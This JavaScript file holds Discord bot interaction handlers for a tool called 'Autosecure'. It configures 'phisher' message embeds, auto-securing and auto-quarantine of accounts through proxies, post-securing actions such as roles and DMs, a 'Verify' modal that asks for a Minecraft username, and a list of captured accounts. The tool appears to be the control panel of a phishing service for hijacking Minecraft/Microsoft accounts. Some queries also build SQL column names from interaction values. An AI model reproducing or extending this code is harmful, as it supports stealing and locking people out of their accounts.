const getButtons = require("../../utils/responses/getButtons")
const { queryParams } = require("../../../db/database");
const cliColor = require('cli-color');
const listSettings = require('../../utils/settings/listSettings');
const help = require("../../Buttons/users/help");
const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { EmbedBuilder } = require('discord.js');
const isblacklisted = require('../../../db/blacklist');
const accountsmsg = require('../../utils/accounts/accountsmsg');
const { showembedphisher, showembederror, showembedautosec, showeditdm } = require('../../utils/responses/showeditembeds');
const isOwner = require('../../../db/isOwner');
const modalBuilder = require('../../utils/modalBuilder')
const generate = require('../../utils/generate')
const listProfile = require("../../utils/hypixelapi/listProfile")
const { DMMonitor, dmMap, addConfig } = require("../../utils/utils/dmmode")
const { addnotification } = require("../../../mainbot/utils/usernotifications");
const listConfiguration = require("../../utils/settings/listConfiguration");
const fs = require('fs');
const path = require('path');
const getbotnumber = require("../../../db/getbotnumber");
const editphishermsg = require("../../utils/responses/editphishermsg");
const autosecureMsg = require("../../utils/embeds/editautosecuremsg")



async function handlesecureconfig(interaction) {
    const selections = interaction.values;
    const userId = interaction.user.id

    try {
        const hasAutoquarantine = selections.some(selected => {
            const parts = selected.split("|");
            return parts[1] === "autoquarantine" && (parts[2] === "1" || parts[2] === 1);
        });

        let canUpdateAutoquarantine = true;

        if (hasAutoquarantine) {
            const proxyCheck = await queryParams(
                `SELECT proxy FROM proxies WHERE user_id = ?`,
                [interaction.user.id]
            );

            if (!proxyCheck || proxyCheck.length === 0) {
                const newMessage = await listConfiguration(userId);
                newMessage.content = "Couldn't turn on Auto-Quarantine! Please setup proxies in `/quarantine`.";
                await interaction.update(newMessage);
                canUpdateAutoquarantine = false;
            }
        }

        for (const selected of selections) {
            const [_, table, newsetting] = selected.split("|");

            if (table === "autoquarantine" && !canUpdateAutoquarantine) {
                continue;
            }

            await queryParams(
                `UPDATE secureconfig SET ${table} = ? WHERE user_id = ?`,
                [newsetting, userId]
            );
        }

        if (canUpdateAutoquarantine) {
            const newMessage = await listConfiguration(userId);
            await interaction.update(newMessage);
        }

    } catch (err) {
        console.error("Error updating features:", err);
        await interaction.editReply({
            content: `❌ Something went wrong while updating your settings.`,
            embeds: [],
            components: []
        });
    }
}

async function handlefeatures(interaction, ownerid, botnumber) {
    const selections = interaction.values;

    try {
 

        const hasAutoquarantine = selections.some(selected => {
            const parts = selected.split("|");
            return parts[1] === "autoquarantine" && parts[2] === "1";
        });

        let canUpdateAutoquarantine = true;

        if (hasAutoquarantine) {
            const proxyCheck = await queryParams(
                `SELECT proxy FROM proxies WHERE user_id = ?`,
                [ownerid]
            );

            if (!proxyCheck || proxyCheck.length === 0) {
                const newMessage = await autosecureMsg(botnumber, ownerid);
                await interaction.update({
                    ...newMessage,
                    content: "Couldn't turn on Auto-Quarantine! Please setup proxies in `/quarantine`."
                });
                canUpdateAutoquarantine = false;
            }
        }

        for (const selected of selections) {
            const [_, table, newsetting] = selected.split("|");

            if (table === "autoquarantine" && !canUpdateAutoquarantine) {
                continue;
            }

            await queryParams(
                `UPDATE autosecure SET ${table} = ? WHERE user_id = ? AND botnumber=?`,
                [newsetting, ownerid, botnumber]
            );
        }

        if (canUpdateAutoquarantine) {
            const newMessage = await autosecureMsg(botnumber, ownerid);
            await interaction.update(newMessage);
        }

    } catch (err) {
        console.error("Error updating features:", err);
        try {
            await interaction.editReply({
                content: `❌ Something went wrong while updating your settings.`,
                embeds: [],
                components: []
            });
        } catch (e) {
            console.error("Failed to send error message:", e);
        }
    }
}

async function handleprofilesplit(client, interaction) {
    const selectedValue = interaction.values[0];
    const [action, username, profile, sensored] = selectedValue.split("|");
    
    let sensoredvalue = sensored === '1' ? true : false;

    interaction.update(await listProfile(username, { sensored: sensoredvalue, list: "skyblock", ping: "", profile: profile }));
}

async function handleSortAccounts(client, interaction, params) {
    const [userId] = params;
    const selectedValue = interaction.values[0];

    const existing = await client.queryParams(
        `SELECT 1 FROM settings WHERE user_id = ?`,
        [userId]
    );

    if (existing.length > 0) {
        await client.queryParams(
            `UPDATE settings SET sortingtype = ? WHERE user_id = ?`,
            [selectedValue, userId]
        );
    } else {
        await client.queryParams(
            `INSERT INTO settings (user_id, sortingtype) VALUES (?, ?)`,
            [userId, selectedValue]
        );
    }

    const msg = await accountsmsg(userId, 1); 
    await interaction.update(msg);
}

async function handlePanelSwitch(client, interaction, action) {
    if (interaction.user.id !== client.username) {
        let users = await client.queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id]);
        
        if (users.length === 0) {
            return interaction.reply({ content: `Invalid permissions!`, ephemeral: true });
        } else if (users[0].editsettings !== 1) {
            return interaction.reply({ content: `You don't have permission to edit settings!`, ephemeral: true });
        }
    }
    
    const isFeaturePanel = action === 'switch_to_features';
    const newMessage = await listSettings(client, client.username, isFeaturePanel);
    await interaction.update(newMessage);
}

async function handlePingToggle(client, interaction) {
    const settings = await client.queryParams(`SELECT ping FROM autosecure WHERE user_id=?`, [client.username]);
    let currentPing = settings[0]?.ping;
    
    let newPing;
    if (currentPing === "None") {
        newPing = "@here";
    } else if (currentPing === "@here") {
        newPing = "@everyone";
    } else {
        newPing = "None";
    }
    
    await client.queryParams(`UPDATE autosecure SET ping=? WHERE user_id=?`, [newPing, client.username]);
    
    const isFeaturePanel = interaction.message.embeds[0].title.includes("Feature");
    const newMessage = await listSettings(client, client.username, isFeaturePanel);
    await interaction.update(newMessage);
}

async function handlePrimaryCycle(client, interaction) {
    const settings = await client.queryParams(`SELECT changeprimary FROM autosecure WHERE user_id=?`, [client.username]);
    let currentValue = settings[0]?.changeprimary;
    
    let newValue;
    if (currentValue === 0) {
        newValue = 1;
    } else if (currentValue === 1) {
        newValue = 2;
    } else if (currentValue === 2) {
        newValue = 0;
    }

    await client.queryParams(`UPDATE autosecure SET changeprimary = ? WHERE user_id = ?`, [newValue, client.username]);

    const newMessage = await listSettings(client, client.username, true);
    await interaction.update(newMessage);
}


async function handleAfterSecureSelect(interaction, botnumber, ownerid) {
    const selectedValue = interaction.values[0];

    if (selectedValue === 'role') {
        const modal = new ModalBuilder()
            .setCustomId('role_modal')
            .setTitle('Enter Role ID');

        const roleInput = new TextInputBuilder()
            .setCustomId('role_id')
            .setLabel('Role ID')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const firstActionRow = new ActionRowBuilder().addComponents(roleInput);
        modal.addComponents(firstActionRow);

        await interaction.showModal(modal);

        try {
            const modalInteraction = await interaction.awaitModalSubmit({
                time: 30000,
                filter: i => i.customId === 'role_modal' && i.user.id === interaction.user.id,
            });

            const roleId = modalInteraction.fields.getTextInputValue('role_id');
            if (!roleId) {
                await modalInteraction.reply({ content: 'Role ID cannot be empty.', ephemeral: true });
                return;
            }

            const jsonData = JSON.stringify({ type: 'role', value: roleId });
            await queryParams(
                `UPDATE autosecure SET aftersecure = ? WHERE user_id = ? AND botnumber = ?`, 
                [jsonData, ownerid, botnumber]
            );

            const newMessage = await editphishermsg(botnumber, ownerid, interaction.user.id);
            await modalInteraction.update(newMessage);
        } catch (error) {
            console.error("Error handling role modal:", error);
        }
    } else if (selectedValue === 'dm') {
        const modal = new ModalBuilder()
            .setCustomId('dm_modal')
            .setTitle('Enter DM Message');

        const messageInput = new TextInputBuilder()
            .setCustomId('dm_message')
            .setLabel('Message to send')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true);

        const firstActionRow = new ActionRowBuilder().addComponents(messageInput);
        modal.addComponents(firstActionRow);

        await interaction.showModal(modal);

        try {
            const modalInteraction = await interaction.awaitModalSubmit({
                time: 30000,
                filter: i => i.customId === 'dm_modal' && i.user.id === interaction.user.id,
            });

            const message = modalInteraction.fields.getTextInputValue('dm_message');
            if (!message) {
                await modalInteraction.reply({ content: 'Message cannot be empty.', ephemeral: true });
                return;
            }

            const jsonData = JSON.stringify({ type: 'dm', value: message });
            await queryParams(
                `UPDATE autosecure SET aftersecure = ? WHERE user_id = ? AND botnumber = ?`, 
                [jsonData, ownerid, botnumber]
            );

            const newMessage = await editphishermsg(botnumber, ownerid, interaction.user.id);
            await modalInteraction.update(newMessage);
        } catch (error) {
            if (error.code === 'InteractionCollectorError' && error.reason === 'time') {
                await interaction.followUp({ 
                    content: 'You didn\'t submit the modal in time.', 
                    ephemeral: true 
                });
            } else {
                console.error("Error handling DM modal:", error);
            }
        }
    } else if (selectedValue === 'dmpreset') {
    const modal = new ModalBuilder()
        .setCustomId('dmpreset_modal')
        .setTitle('Enter DM Preset Name');

    const presetInput = new TextInputBuilder()
        .setCustomId('dmpreset_name')
        .setLabel('Preset Name')
        .setStyle(TextInputStyle.Short)
        .setRequired(true);

    const firstActionRow = new ActionRowBuilder().addComponents(presetInput);
    modal.addComponents(firstActionRow);

    await interaction.showModal(modal);

    try {
        const modalInteraction = await interaction.awaitModalSubmit({
            time: 30000,
            filter: i => i.customId === 'dmpreset_modal' && i.user.id === interaction.user.id,
        });

        let initialmsg = await editphishermsg(botnumber, ownerid, interaction.user.id)

        const presetName = modalInteraction.fields.getTextInputValue('dmpreset_name');
        if (!presetName) {
            initialmsg.content = 'Preset name cannot be empty.'
            await modalInteraction.update(initialmsg)
            return;
        }

        // Check if preset exists
        const check = await queryParams(
            `SELECT * FROM presets WHERE user_id = ? AND botnumber = ? AND name = ?`,
            [ownerid, botnumber, presetName]
        );

        if (check.length === 0) {
            initialmsg.content = `The preset "${presetName}" doesn't exist. Please create it first.`
            await modalInteraction.update(initialmsg)
            return;
        }

        const jsonData = JSON.stringify({ type: 'dmpreset', value: presetName });
        await queryParams(
            `UPDATE autosecure SET aftersecure = ? WHERE user_id = ? AND botnumber = ?`, 
            [jsonData, ownerid, botnumber]
        );

        const newMessage = await editphishermsg(botnumber, ownerid, interaction.user.id);
        newMessage.content = `Changed to dmpreset: ${presetName}`
        await modalInteraction.update(newMessage);
    } catch (error) {
        if (error.code === 'InteractionCollectorError' && error.reason === 'time') {
            await interaction.followUp({ 
                content: 'You didn\'t submit the modal in time.', 
                ephemeral: true 
            });
        } else {
            console.error("Error handling DM preset modal:", error);
        }
    }
} else {
        await queryParams(
            `UPDATE autosecure SET aftersecure = ? WHERE user_id = ? AND botnumber = ?`, 
            [selectedValue, ownerid, botnumber]
        );

        const newMessage = await editphishermsg(botnumber, ownerid, interaction.user.id);
        await interaction.update(newMessage);
    }
}


async function checkBlacklist(interaction) {
    const blacklisted = await isblacklisted(interaction.user.id);
 
    if (blacklisted.blacklisted) {
        const embed = new EmbedBuilder()
            .setColor('#d22b2b')
            .setDescription(`### You're blacklisted from using Autosecure\n\n Reason: ${blacklisted.reason}`);
        await interaction.reply({ embeds: [embed], ephemeral: true });
        return true; 
    }
    return false; 
}

async function showembeds(client, interaction, userid) {
    let botnumber = await getbotnumber(interaction, client, 1, "buttonhandlerautosec");
    const selectedValue = interaction.values[0];
    if (selectedValue === 'phisher') {
        await showembedphisher(client, interaction, botnumber, userid);
    } else if (selectedValue === 'error') {
        await showembederror(client, interaction, botnumber, userid);
    } else if (selectedValue === 'autosecure') {
        await showembedautosec(client, interaction, botnumber, userid);
    } else if (selectedValue === "dmembeds") {
        await showeditdm(client, interaction, botnumber, userid);
    }
}

async function handlechangeusers(client, interaction, params, selectedValues) {
    try {
        const [child, current, ownerid, botnumber] = params;

        if (!Array.isArray(selectedValues) || selectedValues.length === 0) {
            return interaction.reply({ content: `No settings selected.`, ephemeral: true });
        }

        if (interaction.user.id !== ownerid) {
            const permissionCheck = await queryParams(
                `SELECT * FROM users WHERE user_id=? AND child=? AND botnumber=?`,
                [ownerid, interaction.user.id, botnumber]
            );

            if (permissionCheck.length === 0) {
                return interaction.reply({ content: `Invalid permissions!`, ephemeral: true });
            } else if (permissionCheck[0].editclaiming !== 1) {
                return interaction.reply({ 
                    content: `You don't have permission to edit user settings!`, 
                    ephemeral: true 
                });
            }
        }

        const currentValueQuery = await queryParams(
            `SELECT * FROM users WHERE user_id=? AND child=? AND botnumber=?`, 
            [ownerid, child, botnumber]
        );

        if (currentValueQuery.length === 0) {
            return interaction.reply({ content: `User not found in database.`, ephemeral: true });
        }

        const user = currentValueQuery[0];

        // Loop through all selected settings and toggle their values
        for (const selectedValue of selectedValues) {
            if (!(selectedValue in user)) {
                return interaction.reply({ content: `Invalid setting selected: ${selectedValue}`, ephemeral: true });
            }

            const currentValue = user[selectedValue] || 0;
            const newValue = currentValue === 1 ? 0 : 1;

            await queryParams(
                `UPDATE users SET ${selectedValue} = ? WHERE user_id = ? AND child = ? AND botnumber = ?`,
                [newValue, ownerid, child, botnumber]
            );
        }

        await addnotification(client, interaction.user.id);

        const usersMsg = require('../../utils/embeds/usersMsg');
        const updatedMsg = await usersMsg(ownerid, parseInt(current), interaction.user.id, botnumber);

        await interaction.update(updatedMsg);
    } catch (error) {
        console.error("Error handling user settings change:", error);
        await interaction.reply({
            content: "An error occurred while updating user permissions.",
            ephemeral: true
        });
    }
}



async function handleclaimmodal(client, interaction) {
    const [option, oldName, hidden] = interaction.values[0].split("|");
    const [name1, name2] = hidden.split(",");
    const title = name2 ? `Verify: ${name1} | ${name2}` : `Verify: ${name1}`;

    let rId = generate(32); 
    
    await client.queryParams(
        `INSERT INTO actions (id, action) VALUES (?, ?)`, 
        [rId, `claimmodal|${oldName}|`]
    );

    await interaction.showModal(
        modalBuilder(
            `action|${rId}`, 
            title,
            [{
                setCustomId: 'username',
                setMaxLength: 16,
                setMinLength: 3,
                setRequired: true,
                setLabel: "Enter correct Minecraft username",
                setPlaceholder: "ex: Notch",
                setStyle: TextInputStyle.Short
            }]
        )
    );
}




module.exports = {
    handlesecureconfig,
    handlefeatures,
    handleprofilesplit,
    handleSortAccounts,
    handlePanelSwitch,
    handlePingToggle,
    handlePrimaryCycle,
    handleAfterSecureSelect,
    checkBlacklist,
    showembeds,
    handlechangeusers,
    handleclaimmodal
};